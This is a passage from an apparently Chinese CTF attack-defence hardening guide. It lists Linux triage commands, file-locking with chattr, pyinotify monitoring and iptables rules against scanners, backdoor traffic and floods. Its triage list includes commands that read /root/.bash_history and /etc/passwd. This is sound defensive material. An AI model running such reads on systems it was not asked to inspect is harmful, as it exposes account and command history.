 /><span class="line" style="height: 20px;">28</span><br  /><span class="line" style="height: 20px;">29</span><br  /><span class="line" style="height: 20px;">30</span><br  /><span class="line" style="height: 20px;">31</span><br  /><span class="line" style="height: 20px;">32</span><br  /><span class="line" style="height: 20px;">33</span><br  /><span class="line" style="height: 20px;">34</span><br  /><span class="line" style="height: 20px;">35</span><br  /><span class="line" style="height: 20px;">36</span><br  /><span class="line" style="height: 20px;">37</span><br  /><span class="line" style="height: 20px;">38</span><br  /><span class="line" style="height: 20px;">39</span><br  /><span class="line" style="height: 20px;">40</span><br  /><span class="line" style="height: 20px;">41</span><br  /><span class="line" style="height: 20px;">42</span><br  /></pre></td><td class="code" style="padding: 0px;text-align: left;vertical-align: middle;border-width: initial;border-style: none;border-color: initial;"><pre style="overflow: auto;font family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace;font-size:13px;line-height:33px;;padding: 10px;background: rgb(0, 0, 0);line-height: 1.6;border-width: initial;border-style: none;border-color: initial;width: 575.2px;"><span class="line" style="height: 20px;">ssh &lt;-p 端口&gt; username@ip</span><br  /><span class="line" style="height: 20px;">scp 文件路径  username@ip:存放路径</span><br  /><span class="line" style="height: 20px;">cat /root/.bash_history</span><br  /><span class="line" style="height: 20px;color: rgb(150, 152, 150);">#显示最近登录的5个帐号</span><br  /><span class="line" style="height: 20px;">last -n 5|awk <span class="string" style="color: rgb(185, 202, 74);">'{print $1}'</span></span><br  /><span class="line" style="height: 20px;color: rgb(150, 152, 150);">#显示/etc/passwd的账户</span><br  /><span class="line" style="height: 20px;">cat /etc/passwd|awk -F <span class="string" style="color: rgb(185, 202, 74);">':'</span> <span class="string" style="color: rgb(185, 202, 74);">'{print $1}'</span></span><br  /><span class="line" style="height: 20px;color: rgb(150, 152, 150);">#查看UID为0的帐号</span><br  /><span class="line" style="height: 20px;">awk -F: <span class="string" style="color: rgb(185, 202, 74);">'{if($3==0)print $1}'</span> /etc/passwd</span><br  /><span class="line" style="height: 20px;color: rgb(150, 152, 150);">#查找777的权限的文件</span><br  /><span class="line" style="height: 20px;">find . -name <span class="string" style="color: rgb(185, 202, 74);">"*.php"</span> -perm 4777</span><br  /><span class="line" style="height: 20px;color: rgb(150, 152, 150);">#查找24小时内被修改的PHP文件</span><br  /><span class="line" style="height: 20px;">find ./ -mtime 0 -name <span class="string" style="color: rgb(185, 202, 74);">"*.php"</span></span><br  /><span class="line" style="height: 20px;color: rgb(150, 152, 150);">#查看进程</span><br  /><span class="line" style="height: 20px;">ps aux | grep pid或者进程名　　　　</span><br  /><span class="line" style="height: 20px;color: rgb(150, 152, 150);">#查看已建立的网络连接及进程</span><br  /><span class="line" style="height: 20px;">netstat -antulp | grep EST</span><br  /><span class="line" style="height: 20px;color: rgb(150, 152, 150);">#查看指定端口被哪个进程占用</span><br  /><span class="line" style="height: 20px;">lsof -i:端口号 或者 netstat -tunlp|grep 端口号</span><br  /><span class="line" style="height: 20px;color: rgb(150, 152, 150);">#结束进程命令</span><br  /><span class="line" style="height: 20px;"><span class="built_in" style="color: rgb(231, 140, 69);">kill</span> PID</span><br  /><span class="line" style="height: 20px;">killall &lt;进程名&gt;</span><br  /><span class="line" style="height: 20px;">pkill &lt;进程名&gt;</span><br  /><span class="line" style="height: 20px;">pkill -u用户名</span><br  /><span class="line" style="height: 20px;color: rgb(150, 152, 150);">#封杀某个IP或者ip段</span><br  /><span class="line" style="height: 20px;">iptables -I INPUT -s source_ip[/mask] -j DROP</span><br  /><span class="line" style="height: 20px;color: rgb(150, 152, 150);">#禁止从某个主机ssh远程访问登陆到本机</span><br  /><span class="line" style="height: 20px;">iptable -t filter -A INPUT -s source_ip[/mask] -p tcp --dport 22 -j DROP</span><br  /><span class="line" style="height: 20px;color: rgb(150, 152, 150);">#备份mysql数据库</span><br  /><span class="line" style="height: 20px;">mysqldump -u 用户名 -p 密码 数据库名 &gt; bak.sql</span><br  /><span class="line" style="height: 20px;">mysqldump --all-databases &gt; bak.sql</span><br  /><span class="line" style="height: 20px;color: rgb(150, 152, 150);">#还原mysql数据库</span><br  /><span class="line" style="height: 20px;">mysql -u 用户名 -p 密码 数据库名 &lt; bak.sql</span><br  /><span class="line" style="height: 20px;color: rgb(150, 152, 150);">#定时任务，在固定的时间间隔执行指定的系统指令或shell script</span><br  /><span class="line" style="height: 20px;">crontab [-u user] file_name</span><br  /><span class="line" style="height: 20px;">crontab [-u user] [-e |-l| -r]</span><br  /><span class="line" style="height: 20px;color: rgb(150, 152, 150);">#检测所有的tcp连接数量及状态</span><br  /><span class="line" style="height: 20px;">netstat -ant|awk|grep|sed -e -e|sort|uniq -c|sort -rn</span><br  /><span class="line" style="height: 20px;color: rgb(150, 152, 150);">#查看页面访问排名前十的IP</span><br  /><span class="line" style="height: 20px;">cat /var/<span class="built_in" style="color: rgb(231, 140, 69);">log</span>/apache2/access.log|cut -f1 -d|sort|uniq -c|sort -k  -r|head -　　</span><br  /><span class="line" style="height: 20px;color: rgb(150, 152, 150);">#查看页面访问排名前十的URL</span><br  /><span class="line" style="height: 20px;">cat /var/<span class="built_in" style="color: rgb(231, 140, 69);">log</span>/apache2/access.log|cut -f4 -d|sort|uniq -c|sort -k  -r|head -</span><br  /></pre></td></tr></tbody></table></figure><h5 style="margin-top: 20px;margin-bottom: 15px;padding-top: 10px;font-weight: bold;line-height: 1.5;font family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif;font-size:14px;line-height:34px;;color: rgb(85, 85, 85);white-space: normal;background-color: rgb(255, 255, 255);">文件监控</h5><p style="margin-bottom: 25px;color: rgb(85, 85, 85);font family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif;font-size:14px;line-height:34px;;white-space: normal;background-color: rgb(255, 255, 255);">为了监控我们的web目录，我们可以对文件的增加或修改等操作进行限制，粗暴一点的话，就禁止任何文件产生变化。</p><ul style="" class=" list-paddingleft-2"><li><p style="margin-bottom: 25px;"><span style="font-size:14px;line-height:34px;;">使用系统&nbsp;</span><code style="font family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace;font-size:13px;line-height:33px;;padding: 2px 4px;background: rgb(238, 238, 238);border-radius: 3px;"><span style="font-size:14px;line-height:34px;;">chattr +i</span></code><span style="font-size:14px;line-height:34px;;">命令</span></p><p style="margin-bottom: 25px;"><span style="font-size:14px;line-height:34px;;">Linux下的文件有着隐藏属性，可以用</span><code style="font family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace;font-size:13px;line-height:33px;;padding: 2px 4px;background: rgb(238, 238, 238);border-radius: 3px;"><span style="font-size:14px;line-height:34px;;">lsattr</span></code><span style="font-size:14px;line-height:34px;;">命令查看。其中有一个</span><code style="font family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace;font-size:13px;line-height:33px;;padding: 2px 4px;background: rgb(238, 238, 238);border-radius: 3px;"><span style="font-size:14px;line-height:34px;;">i</span></code><span style="font-size:14px;line-height:34px;;">属性，表示不得更动任意文件或目录。如果你已经有</span><code style="font family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace;font-size:13px;line-height:33px;;padding: 2px 4px;background: rgb(238, 238, 238);border-radius: 3px;"><span style="font-size:14px;line-height:34px;;">root</span></code><span style="font-size:14px;line-height:34px;;">或者</span><code style="font family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace;font-size:13px;line-height:33px;;padding: 2px 4px;background: rgb(238, 238, 238);border-radius: 3px;"><span style="font-size:14px;line-height:34px;;">sudo</span></code><span style="font-size:14px;line-height:34px;;">权限了，那么你可以使用</span><code style="font family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace;font-size:13px;line-height:33px;;padding: 2px 4px;background: rgb(238, 238, 238);border-radius: 3px;"><span style="font-size:14px;line-height:34px;;">chattr +i</span></code><span style="font-size:14px;line-height:34px;;">&nbsp;修改文件隐藏属性，这样所有用户都不能对该文件或者目录进行修改删除等操作（包括</span><code style="font family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace;font-size:13px;line-height:33px;;padding: 2px 4px;background: rgb(238, 238, 238);border-radius: 3px;"><span style="font-size:14px;line-height:34px;;">root</span></code><span style="font-size:14px;line-height:34px;;">），如果想进行修改，必须用</span><code style="font family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace;font-size:13px;line-height:33px;;padding: 2px 4px;background: rgb(238, 238, 238);border-radius: 3px;"><span style="font-size:14px;line-height:34px;;">chattr -i</span></code><span style="font-size:14px;line-height:34px;;">取消隐藏属性。</span></p><blockquote style="margin-top: 0px;margin-bottom: 0px;padding-top: 0px;padding-right: 15px;padding-left: 15px;color: rgb(102, 102, 102);border-left-width: 4px;border-left-color: rgb(221, 221, 221);"><p style="margin-bottom: 25px;">e.g.</p><p style="margin-bottom: 25px;">防止系统中某个关键文件被修改：<code style="font family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace;font-size:13px;line-height:33px;;padding: 2px 4px;color: rgb(85, 85, 85);background: rgb(238, 238, 238);border-radius: 3px;">chattr +i /etc/profile</code></p><p style="margin-bottom: 25px;">将/var/www/html目录下的文件设置为不允许任何人修改：&nbsp;<code style="font family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace;font-size:13px;line-height:33px;;padding: 2px 4px;color: rgb(85, 85, 85);background: rgb(238, 238, 238);border-radius: 3px;">chattr -R +i /var/www/html</code></p></blockquote></li><li><p style="margin-bottom: 25px;"><span style="font-size:14px;line-height:34px;;">使用python的第三方库pyinotify</span></p><p style="margin-bottom: 25px;"><span style="font-size:14px;line-height:34px;;">python的第三方库pyinotify可以让我们很方便地实现这些功能。但是由于是第三方库，线下赛中通常没法联网安装库，所以我们可以提前准备好source code以在比赛时安装。</span></p><blockquote style="margin-top: 0px;margin-bottom: 0px;padding-top: 0px;padding-right: 15px;padding-left: 15px;color: rgb(102, 102, 102);border-left-width: 4px;border-left-color: rgb(221, 221, 221);"><p style="margin-bottom: 25px;">下载地址：https://pypi.python.org/pypi/pyinotify&nbsp;（如果比赛可以联网，建议直接通过pip安装）</p><p style="margin-bottom: 25px;">安装方法：解压，然后执行<code style="font family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace;font-size:13px;line-height:33px;;padding: 2px 4px;color: rgb(85, 85, 85);background: rgb(238, 238, 238);border-radius: 3px;">sudo pythonXXX setup.py install</code></p><p style="margin-bottom: 25px;">使用方法：<code style="font family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace;font-size:13px;line-height:33px;;padding: 2px 4px;color: rgb(85, 85, 85);background: rgb(238, 238, 238);border-radius: 3px;">python -m pyinotify monitoring_path</code></p></blockquote><p style="margin-bottom: 25px;"><span style="font-size:14px;line-height:34px;;">但由于监控事件太过杂，很多并不是我们关注的，并且我们不仅仅要监控，还需要对某些操作进行自动处理，因此我们可以用脚本针对性地实现我们需要的功能：monitor_withPyinotify。</span></p></li></ul><h5 style="margin-top: 20px;margin-bottom: 15px;padding-top: 10px;font-weight: bold;line-height: 1.5;font family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif;font-size:14px;line-height:34px;;color: rgb(85, 85, 85);white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">网络控制</span></h5><p style="margin-bottom: 25px;color: rgb(85, 85, 85);font family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif;font-size:14px;line-height:34px;;white-space: normal;background-color: rgb(255, 255, 255);">网络防护一定少不了 iptables了，但使用iptables需要有管理员权限。对于比赛环境，我们完全可以配置一个近乎苛刻的配置防火墙策略。</p><p style="margin-bottom: 25px;">只开放一些比赛的必要端口，也可以防止后门的连接</p><figure class="highlight bash" style="margin-top: 20px;margin-bottom: 20px;overflow: auto;font-size:13px;line-height:33px;;color: rgb(234, 234, 234);background: rgb(0, 0, 0);line-height: 1.6;border-radius: 1px;"><table width="NaN" style="width: 556px;"><tbody><tr style="background-color: rgb(249, 249, 249);"><td class="gutter" style="padding: 0px;text-align: left;vertical-align: middle;border-width: initial;border-style: none;border-color: initial;user-select: none;"><pre style="overflow: auto;font family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace;font-size:13px;line-height:33px;;padding: 10px;color: rgb(102, 102, 102);background: rgb(41, 41, 41);line-height: 1.6;border-width: initial;border-style: none;border-color: initial;text-align: right;"><span class="line" style="height: 20px;">1</span><br  /><span class="line" style="height: 20px;">2</span><br  /><span class="line" style="height: 20px;">3</span><br  /><span class="line" style="height: 20px;">4</span><br  /><span class="line" style="height: 20px;">5</span><br  /><span class="line" style="height: 20px;">6</span><br  /><span class="line" style="height: 20px;">7</span><br  /><span class="line" style="height: 20px;">8</span><br  /><span class="line" style="height: 20px;">9</span><br  /><span class="line" style="height: 20px;">10</span><br  /><span class="line" style="height: 20px;">11</span><br  /></pre></td><td class="code" style="padding: 0px;text-align: left;vertical-align: middle;border-width: initial;border-style: none;border-color: initial;"><pre style="overflow: auto;font family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace;font-size:13px;line-height:33px;;padding: 10px;background: rgb(0, 0, 0);line-height: 1.6;border-width: initial;border-style: none;border-color: initial;width: 856.8px;"><span class="line" style="height: 20px;color: rgb(150, 152, 150);">#开放ssh</span><br  /><span class="line" style="height: 20px;">iptables -A INPUT -p tcp --dport 22 -j ACCEPT</span><br  /><span class="line" style="height: 20px;">iptables -A OUTPUT -p tcp --sport 22 -j ACCEPT</span><br  /><span class="line" style="height: 20px;color: rgb(150, 152, 150);">#打开80端口</span><br  /><span class="line" style="height: 20px;">iptables -A INPUT -p tcp --dport 80 -j ACCEPT</span><br  /><span class="line" style="height: 20px;">iptables -A OUTPUT -p tcp --sport 80 -j ACCEPT</span><br  /><span class="line" style="height: 20px;color: rgb(150, 152, 150);">#开启多端口简单用法</span><br  /><span class="line" style="height: 20px;">iptables -A INPUT -p tcp -m multiport --dport 22,80,8080,8081 -j ACCEPT</span><br  /><span class="line" style="height: 20px;color: rgb(150, 152, 150);">#允许外部访问本地多个端口 如8080，8081，8082,且只允许是新连接、已经连接的和已经连接的延伸出新连接的会话</span><br  /><span class="line" style="height: 20px;">iptables -A INPUT -p tcp -m multiport --dport 8080,8081,8082,12345 -m state --state NEW,ESTABLISHED,RELATED -j ACCEPT</span><br  /><span class="line" style="height: 20px;">iptables -A OUTPUT -p tcp -m multiport --sport 8080,8081,8082,12345 -m state --state ESTABLISHED -j ACCEPT</span><br  /></pre></td></tr></tbody></table></figure><p style="margin-bottom: 25px;">限制ssh登陆，进行访问控制</p><figure class="highlight bash" style="margin-top: 20px;margin-bottom: 20px;overflow: auto;font-size:13px;line-height:33px;;color: rgb(234, 234, 234);background: rgb(0, 0, 0);line-height: 1.6;border-radius: 1px;"><table width="NaN"><tbody><tr style="background-color: rgb(249, 249, 249);"><td class="gutter" style="padding: 0px;text-align: left;vertical-align: middle;border-width: initial;border-style: none;border-color: initial;user-select: none;"><pre style="overflow: auto;font family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace;font-size:13px;line-height:33px;;padding: 10px;color: rgb(102, 102, 102);background: rgb(41, 41, 41);line-height: 1.6;border-width: initial;border-style: none;border-color: initial;text-align: right;"><span class="line" style="height: 20px;">1</span><br  /><span class="line" style="height: 20px;">2</span><br  /><span class="line" style="height: 20px;">3</span><br  /><span class="line" style="height: 20px;">4</span><br  /></pre></td><td class="code" style="padding: 0px;text-align: left;vertical-align: middle;border-width: initial;border-style: none;border-color: initial;"><pre style="overflow: auto;font family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace;font-size:13px;line-height:33px;;padding: 10px;background: rgb(0, 0, 0);line-height: 1.6;border-width: initial;border-style: none;border-color: initial;width: 506.4px;"><span class="line" style="height: 20px;color: rgb(150, 152, 150);">#禁止从xx.xx.xx.xx远程登陆到本机</span><br  /><span class="line" style="height: 20px;">iptables -t filter -A INPUT -s xx.xx.xx.xx -p tcp --dport 22 -j DROP</span><br  /><span class="line" style="height: 20px;color: rgb(150, 152, 150);">#允许xx.xx.xx.xx网段远程登陆访问ssh</span><br  /><span class="line" style="height: 20px;">iptables -A INPUT -s xx.xx.xx.1/24 -p tcp --dport 22 -j ACCEPT</span><br  /></pre></td></tr></tbody></table></figure><p style="margin-bottom: 25px;">限制IP连接数和连接速率</p><p style="margin-bottom: 25px;"><span style="font-size:14px;line-height:34px;;">我们可以限制IP的网络连接数和速度等，限制过快的连接频率，这样可以在一定程度上限制对方的扫描器。狠一点的话，甚至可以让对方只能以手工点网页的速度与访问</span></p><figure class="highlight bash" style="margin-top: 20px;margin-bottom: 20px;overflow: auto;font-size:13px;line-height:33px;;color: rgb(234, 234, 234);background: rgb(0, 0, 0);line-height: 1.6;border-radius: 1px;"><table width="NaN" style="width: 556px;"><tbody><tr style="background-color: rgb(249, 249, 249);"><td class="gutter" style="padding: 0px;text-align: left;vertical-align: middle;border-width: initial;border-style: none;border-color: initial;user-select: none;"><pre style="overflow: auto;font family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace;font-size:13px;line-height:33px;;padding: 10px;color: rgb(102, 102, 102);background: rgb(41, 41, 41);line-height: 1.6;border-width: initial;border-style: none;border-color: initial;text-align: right;"><span class="line" style="height: 20px;">1</span><br  /><span class="line" style="height: 20px;">2</span><br  /><span class="line" style="height: 20px;">3</span><br  /><span class="line" style="height: 20px;">4</span><br  /><span class="line" style="height: 20px;">5</span><br  /><span class="line" style="height: 20px;">6</span><br  /><span class="line" style="height: 20px;">7</span><br  /><span class="line" style="height: 20px;">8</span><br  /></pre></td><td class="code" style="padding: 0px;text-align: left;vertical-align: middle;border-width: initial;border-style: none;border-color: initial;"><pre style="overflow: auto;font family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace;font-size:13px;line-height:33px;;padding: 10px;background: rgb(0, 0, 0);line-height: 1.6;border-width: initial;border-style: none;border-color: initial;width: 835.2px;"><span class="line" style="height: 20px;color: rgb(150, 152, 150);">#单个IP的最大连接数为 30</span><br  /><span class="line" style="height: 20px;">iptables -I INPUT -p tcp --dport 80 -m connlimit --connlimit-above 30 -j REJECT</span><br  /><span class="line" style="height: 20px;color: rgb(150, 152, 150);">#单个IP在60秒内只允许最多新建15个连接</span><br  /><span class="line" style="height: 20px;">iptables -A INPUT -p tcp --dport 80 -m recent --name BAD_HTTP_ACCESS --update --seconds 60 --hitcount 15 -j REJECT</span><br  /><span class="line" style="height: 20px;">iptables -A INPUT -p tcp --dport 80 -m recent --name BAD_HTTP_ACCESS --<span class="built_in" style="color: rgb(231, 140, 69);">set</span> -j ACCEPT</span><br  /><span class="line" style="height: 20px;color: rgb(150, 152, 150);">#允许外部访问本机80端口，且本机初始只允许有10个连接，每秒新增加2个连接，如果访问超过此限制则拒接 （此方式可以限制一些攻击）</span><br  /><span class="line" style="height: 20px;">iptables -A INPUT -p tcp --dport 80 -m <span class="built_in" style="color: rgb(231, 140, 69);">limit</span> --<span class="built_in" style="color: rgb(231, 140, 69);">limit</span> 2/s --<span class="built_in" style="color: rgb(231, 140, 69);">limit</span>-burst 10 -j ACCEPT</span><br  /><span class="line" style="height: 20px;">iptables -A OUTPUT -p tcp --sport 80 -j ACCEPT</span><br  /></pre></td></tr></tbody></table></figure><p style="margin-bottom: 25px;"><span style="font-size:14px;line-height:34px;;">再猥琐一点，可以定时断开已经建立的连接，让对方只能断断续续的访问</span></p><p style="margin-bottom: 25px;">数据包简单识别，防止端口复用类的后门或者shell</p><p style="margin-bottom: 25px;"><span style="font-size:14px;line-height:34px;;">假设病毒木马程序通过</span><code style="font family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace;font-size:13px;line-height:33px;;padding: 2px 4px;background: rgb(238, 238, 238);border-radius: 3px;"><span style="font-size:14px;line-height:34px;;">22</span></code><span style="font-size:14px;line-height:34px;;">，</span><code style="font family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace;font-size:13px;line-height:33px;;padding: 2px 4px;background: rgb(238, 238, 238);border-radius: 3px;"><span style="font-size:14px;line-height:34px;;">80</span></code><span style="font-size:14px;line-height:34px;;">端口向服务器外传送数据，这种方式向外发的数据不是我们通过访问网页请求而回应的数据包。我们可以禁止这些没有通过请求回应的数据包。</span></p><figure class="highlight bash" style="margin-top: 20px;margin-bottom: 20px;overflow: auto;font-size:13px;line-height:33px;;color: rgb(234, 234, 234);background: rgb(0, 0, 0);line-height: 1.6;border-radius: 1px;"><table width="NaN" style="width: 556px;"><tbody><tr style="background-color: rgb(249, 249, 249);"><td class="gutter" style="padding: 0px;text-align: left;vertical-align: middle;border-width: initial;border-style: none;border-color: initial;user-select: none;"><pre style="overflow: auto;font family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace;font-size:13px;line-height:33px;;padding: 10px;color: rgb(102, 102, 102);background: rgb(41, 41, 41);line-height: 1.6;border-width: initial;border-style: none;border-color: initial;text-align: right;"><span class="line" style="height: 20px;">1</span><br  /><span class="line" style="height: 20px;">2</span><br  /><span class="line" style="height: 20px;">3</span><br  /></pre></td><td class="code" style="padding: 0px;text-align: left;vertical-align: middle;border-width: initial;border-style: none;border-color: initial;"><pre style="overflow: auto;font family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace;font-size:13px;line-height:33px;;padding: 10px;background: rgb(0, 0, 0);line-height: 1.6;border-width: initial;border-style: none;border-color: initial;width: 564px;"><span class="line" style="height: 20px;">iptables -A OUTPUT -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT</span><br  /><span class="line" style="height: 20px;">iptables -A OUTPUT -p tcp --sport 80 -m state --state ESTABLISHED -j ACCEPT</span><br  /><span class="line" style="height: 20px;">iptables -A OUTPUT -p tcp --sport 443 -m state --state ESTABLISHED -j ACCEPT</span><br  /></pre></td></tr></tbody></table></figure><p style="margin-bottom: 25px;">限制访问</p><p style="margin-bottom: 25px;">如果对方来势太凶，我们可以限制或者封杀他们的ip段。</p><figure class="highlight bash" style="margin-top: 20px;margin-bottom: 20px;overflow: auto;font-size:13px;line-height:33px;;color: rgb(234, 234, 234);background: rgb(0, 0, 0);line-height: 1.6;border-radius: 1px;"><table width="NaN"><tbody><tr style="background-color: rgb(249, 249, 249);"><td class="gutter" style="padding: 0px;text-align: left;vertical-align: middle;border-width: initial;border-style: none;border-color: initial;user-select: none;"><pre style="overflow: auto;font family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace;font-size:13px;line-height:33px;;padding: 10px;color: rgb(102, 102, 102);background: rgb(41, 41, 41);line-height: 1.6;border-width: initial;border-style: none;border-color: initial;text-align: right;"><span class="line" style="height: 20px;">1</span><br  /><span class="line" style="height: 20px;">2</span><br  /><span class="line" style="height: 20px;">3</span><br  /><span class="line" style="height: 20px;">4</span><br  /><span class="line" style="height: 20px;">5</span><br  /></pre></td><td class="code" style="padding: 0px;text-align: left;vertical-align: middle;border-width: initial;border-style: none;border-color: initial;"><pre style="overflow: auto;font family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace;font-size:13px;line-height:33px;;padding: 10px;background: rgb(0, 0, 0);line-height: 1.6;border-width: initial;border-style: none;border-color: initial;width: 435.2px;"><span class="line" style="height: 20px;color: rgb(150, 152, 150);">#禁止从客户机1.1.1.4访问1.1.1.5上的任何服务</span><br  /><span class="line" style="height: 20px;">iptable -t filter -A FORWARD -s 1.1.1.4 -d 1.1.1.5 -j DROP</span><br  /><span class="line" style="height: 20px;color: rgb(150, 152, 150);">#封杀1.1.1.4这个IP或者某个ip段</span><br  /><span class="line" style="height: 20px;">iptables -I INPUT -s 1.1.1.4 -j DROP</span><br  /><span class="line" style="height: 20px;">iptables -I INPUT -s 1.1.1.1/24 -j DROP</span><br  /></pre></td></tr></tbody></table></figure><p style="margin-bottom: 25px;">过滤异常报文</p><p style="margin-bottom: 25px;"><span style="font-size:14px;line-height:34px;;">iptables有一个TCP匹配扩展协议–tcp-flags，功能是过滤TCP中的一些包，比如SYN包，ACK包，FIN包，RST包等等。举个例子，我们知道SYN是建立连接，RST是重置连接，如果这两个同时出现，就知道这样的包是有问题的，应该丢弃。下面的例子是利用–tcp-flags参数，对一些包进行标识过滤，扔掉异常的数据包。</span></p><figure class="highlight bash" style="margin-top: 20px;margin-bottom: 20px;overflow: auto;font-size:13px;line-height:33px;;color: rgb(234, 234, 234);background: rgb(0, 0, 0);line-height: 1.6;border-radius: 1px;"><table width="NaN" style="width: 556px;"><tbody><tr style="background-color: rgb(249, 249, 249);"><td class="gutter" style="padding: 0px;text-align: left;vertical-align: middle;border-width: initial;border-style: none;border-color: initial;user-select: none;"><pre style="overflow: auto;font family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace;font-size:13px;line-height:33px;;padding: 10px;color: rgb(102, 102, 102);background: rgb(41, 41, 41);line-height: 1.6;border-width: initial;border-style: none;border-color: initial;text-align: right;"><span class="line" style="height: 20px;">1</span><br  /><span class="line" style="height: 20px;">2</span><br  /><span class="line" style="height: 20px;">3</span><br  /><span class="line" style="height: 20px;">4</span><br  /><span class="line" style="height: 20px;">5</span><br  /><span class="line" style="height: 20px;">6</span><br  /><span class="line" style="height: 20px;">7</span><br  /><span class="line" style="height: 20px;">8</span><br  /><span class="line" style="height: 20px;">9</span><br  /><span class="line" style="height: 20px;">10</span><br  /><span class="line" style="height: 20px;">11</span><br  /><span class="line" style="height: 20px;">12</span><br  /></pre></td><td class="code" style="padding: 0px;text-align: left;vertical-align: middle;border-width: initial;border-style: none;border-color: initial;"><pre style="overflow: auto;font family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace;font-size:13px;line-height:33px;;padding: 10px;background: rgb(0, 0, 0);line-height: 1.6;border-width: initial;border-style: none;border-color: initial;width: 535.2px;"><span class="line" style="height: 20px;color: rgb(150, 152, 150);">#表示 SYN,FIN,ACK,RST的标识都检查，但只匹配SYN标识</span><br  /><span class="line" style="height: 20px;">iptables -A INPUT -p tcp --tcp-flags SYN,FIN,ACK,RST SYN</span><br  /><span class="line" style="height: 20px;color: rgb(150, 152, 150);">#匹配SYN标识位</span><br  /><span class="line" style="height: 20px;">iptables -A INPUT -p tcp --syn</span><br  /><span class="line" style="height: 20px;color: rgb(150, 152, 150);">#检查所有的标识位，匹配到FIN URG PSH的丢弃</span><br  /><span class="line" style="height: 20px;">iptables -A INPUT -p tcp --tcp-flags ALL FIN,URG,PSH -j DROP</span><br  /><span class="line" style="height: 20px;color: rgb(150, 152, 150);">#丢弃没标志位的包</span><br  /><span class="line" style="height: 20px;">iptables -A INPUT -p tcp --tcp-flags ALL NONE -j DROP</span><br  /><span class="line" style="height: 20px;color: rgb(150, 152, 150);">#匹配到SYN ACK FIN URG RST PSH的丢弃（类似的操作自行举一反三）</span><br  /><span class="line" style="height: 20px;">iptables -A INPUT -p tcp --tcp-flags ALL SYN,RST,ACK,FIN,URG,PSH -j DROP</span><br  /><span class="line" style="height: 20px;color: rgb(150, 152, 150);">#匹配到 SYN,RST的丢弃</span><br  /><span class="line" style="height: 20px;">iptables -A INPUT -p tcp --tcp-flags SYN,RST SYN,RST -j DROP</span><br  /></pre></td></tr></tbody></table></figure><p style="margin-bottom: 25px;">防DDOS</p><figure class="highlight bash" style="margin-top: 20px;margin-bottom: 20px;overflow: auto;font-size:13px;line-height:33px;;color: rgb(234, 234, 234);background: rgb(0, 0, 0);line-height: 1.6;border-radius: 1px;"><table width="NaN" style="width: 556px;"><tbody><tr style="background-color: rgb(249, 249, 249);"><td class="gutter" style="padding: 0px;text-align: left;vertical-align: middle;border-width: initial;border-style: none;border-color: initial;user-select: none;"><pre style="overflow: auto;font family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace;font-size:13px;line-height:33px;;padding: 10px;color: rgb(102, 102, 102);background: rgb(41, 41, 41);line-height: 1.6;border-width: initial;border-style: none;border-color: initial;text-align: right;"><span class="line" style="height: 20px;">1</span><br  /></pre></td><td class="code" style="padding: 0px;text-align: left;vertical-align: middle;border-width: initial;border-style: none;border-color: initial;"><pre style="overflow: auto;font family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace;font-size:13px;line-height:33px;;padding: 10px;background: rgb(0, 0, 0);line-height: 1.6;border-width: initial;border-style: none;border-color: initial;width: 664px;"><span class="line" style="height: 20px;">iptables -A INPUT -p tcp --dport 80 -m <span class="built_in" style="color: rgb(231, 140, 69);">limit</span> --<span class="built_in" style="color: rgb(231, 140, 69);">limit</span> 20/minute --<span class="built_in" style="color: rgb(231, 140, 69);">limit</span>-burst 100 -j ACCEPT</span><br  /></pre></td></tr></tbody></table></figure><blockquote style="margin-top: 0px;margin-bottom: 0px;padding-top: 0px;padding-right: 15px;padding-left: 15px;color: rgb(102, 102, 102);border-left-width: 4px;border-left-color: rgb(221, 221, 221);"><p style="margin-bottom: 25px;"><code style="font family: consolas, Menlo, &quot;PingFang SC&quot;, 